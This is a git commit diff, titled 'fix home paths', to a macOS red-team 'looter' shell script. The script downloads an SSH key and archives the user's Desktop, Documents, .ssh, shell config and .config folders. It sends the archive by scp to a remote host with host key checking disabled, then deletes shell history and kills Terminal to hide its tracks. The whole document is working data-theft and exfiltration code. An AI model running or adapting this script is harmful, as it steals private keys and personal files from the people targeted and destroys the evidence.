c9de70cdd4da5b38fd41b364570e183162c827bc
un1x01d <>
2022-08-20 01:45:13 -0400

    fix home paths

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -11,28 +11,28 @@
 #  - Upload the pivate key to any web server (for external just use dropbox).
 #  - Set the URL to the key uploaded.
 #  - Set the SSH server address
-#  - Run! - The file will be saved as .loot.tgz on the remote host.
+#  - Run! - The lootfile will be saved as .loot.tgz on the remote host.
 
 
 
 SSH_HOST=""
 SSH_USER=""
 SSH_KEY_URL=""
-HOME_DIR="/Users/$USER"
 LOCAL_LOOT_PATH="/tmp/.s/.t/.e/.a/.l/"
 REMOTE_LOOT_PATH="~/demo/"
 
+cd $HOME ; find . | grep -v .git > $LOCAL_LOOT_PATH/home_dir_list.txt
+cd $HOME/Downloads ; find . | grep -v .git > $LOCAL_LOOT_PATH/downloads_dir_list.txt
 
 mkdir -p $LOCAL_LOOT_PATH
 curl -s $SSH_KEY_URL -o $LOCAL_LOOT_PATH/.s 
 chmod 600 $LOCAL_LOOT_PATH/.s
 
 cd $LOCAL_LOOT_PATH
-tar cfz .loot.tgz $HOME_DIR/Desktop $HOME_DIR/Documents $HOME_DIR/.ssh $HOME_DIR/.bash* $HOME_DIR/.config $HOME_DIR/.zsh*
+tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
 
 scp -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATH/.s $LOCAL_LOOT_PATH/.loot.tgz ${SSH_USER}@${SSH_HOST}:$REMOTE_LOOT_PATH
 
-set -e && rm -f $HOME_DIR/Desktop/.s.png && rm -rf /tmp/.s $HOME_DIR/.bash_history $HOME_DIR/.zsh_history && history -c
+set -e && rm -rf /tmp/.s $HOME/.bash_history $HOME/.zsh_history && history -c
 
 killall Terminal
-
